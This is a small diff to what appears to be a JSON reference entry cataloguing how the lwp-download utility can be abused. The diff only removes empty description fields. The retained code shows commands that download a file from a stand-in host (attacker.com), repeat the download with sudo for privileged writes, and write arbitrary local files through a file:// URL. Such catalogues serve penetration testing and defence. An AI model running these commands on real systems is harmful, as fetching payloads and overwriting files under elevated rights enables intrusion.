@@ -2,13 +2,13 @@
   "functions": {
     "file-download": [
       {
-        "description": "",
+        
         "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
       }
     ],
@@ -20,7 +20,7 @@
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n"
       }
     ]
